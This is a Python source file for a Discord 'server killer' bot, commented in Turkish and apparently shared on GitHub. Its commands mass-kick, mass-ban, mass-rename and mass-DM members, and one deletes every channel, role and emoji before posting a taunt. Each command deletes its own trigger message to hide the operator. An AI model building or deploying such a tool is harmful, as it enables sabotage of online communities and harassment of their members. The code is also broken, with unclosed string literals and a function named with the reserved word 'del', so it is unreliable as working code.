#Discord Sunucu Killer
#01/01/2022
#Github: https://github.com/rvbatu/Discord-Sunucu-Killer/blob/main/README.md

import discord
from discord.ext import commands
from discord.ext.commands import bot
import asyncio
import time
import random
intents = discord.Intents(messages=True, guilds=True, members=True)

client = commands.Bot(command_prefix='!', intents=intents)
##prefix degisti##

client.remove_command("help")

@client.event
async def on_ready():
    print ("1")

@client.event
async def on_server_join(server):
    print("Katiliyor {0}".format(server.name))


@client.command(pass_context=True)
async def secret(ctx):
    await ctx.message.delete()
    member = ctx.message.author

    embed = discord.Embed(
        colour = discord.Colour.blue()
    )

    embed.set_author(name='Secret')
    embed.add_field(name='At', value='Tum uyeleri at', inline=False)
    embed.add_field(name='Ban', value='Tum uyeleri banla', inline=False)
    embed.add_field(name='Nam', value='Tum uyelerin ismini degistir', inline=False)
    embed.add_field(name='Mes', value='Uyelere mesaj gonder', inline=False)
    embed.add_field(name='Del', value='Her seyi sil', inline=False)
    embed.add_field(name='Ping', value='Client ping (expressed in MS)', inline=False)
    embed.add_field(name='Bilg', value='Kullanici hakkinda bilgi', inline=False)
    await member.send(embed=embed)



@client.command(pass_context=True)
async def at(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild
    for member in list(client.get_all_members()):
        try:
            await guild.kick(member)
            print (f"{member.name} atildi")
        except:
            print (f"{member.name} atilamadi)
        print ("Tamamlandi: atildi")



@client.command(pass_context=True)
async def Ban(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild
    for member in list(client.get_all_members()):
        try:
            await guild.ban(member)
            print ("User " + member.name + " Banlandi")
        except:
            pass
    print ("Tamamlandi: banladi)



@client.command(pass_context=True)
async def Nam(ctx, rename_to):
    await ctx.message.delete()
    for member in list(client.get_all_members()):
        try:
            await member.edit(nick=rename_to)
            print (f"{member.name} ismini degisti {rename_to}")
        except:
            print (f"{member.name} adlandirilmadi")
        print("Tamamlandi: adlandirildi")


@client.command(pass_context=True)
async def Mes(ctx):
    await ctx.message.delete()
    for member in list(client.get_all_members()):
        await asyncio.sleep(0)
        try:
            await member.send("ISTEDIGINIZ MESAJ")
        except:
            pass
        print("Tamamlandi: mesaj uyeler")



@client.command(pass_context=True)
async def del(ctx):
    await ctx.message.delete()
    for channel in list(ctx.message.guild.channels):
        try:
            await channel.delete()
            print (channel.name + " silindi")
        except:
            pass
        guild = ctx.message.guild
        channel = await guild.create_text_channel("Patladi")
        await channel.send("Patladi haha")
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
            print (f"{role.name} silindi")
        except:
            pass
    for member in list(client.get_all_members()):
        try:
            await guild.ban(member)
            print ("User " + member.name + " banlandi")
        except:
            pass
    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
            print (f"{emoji.name} silindi")
        except:
            pass    
    print("Bomba patladi: batu tarafindan)




@client.command(pass_context=True)
async def ping(ctx):
    await ctx.message.delete()
    member = ctx.message.author
    channel = ctx.message.channel
    t1 = time.perf_counter()
    await channel.trigger_typing()
    t2 = time.perf_counter()
    embed=discord.Embed(title=None, description='Ping: {}'.format(round((t2-t1)*1000)), color=0x2874A6)
    await member.send(embed=embed)
    print("Action completed: sunucu ping")



@client.command(pass_context=True)
async def Bilg(ctx, member: discord.Member=None):
    await ctx.message.delete()
    member = ctx.message.author
    channel = ctx.message.channel
    if member is None:
        pass
    else:
        await channel.send("**Kullanicinin adi: {}**".format(member.name) + "\n**Kullanici ID {}**".format(member.id) + "\n**Durumu: {}**".format(member.status) + "\n**En yuksek rolu: {}**".format(member.top_role) + "\n**Bu tarihte katildi: {}**".format(member.joined_at))
    print("Tamamlandi Bilgi")


client.run("BOTUN TOKENI")

#batu#9929 tarafindan yazildi
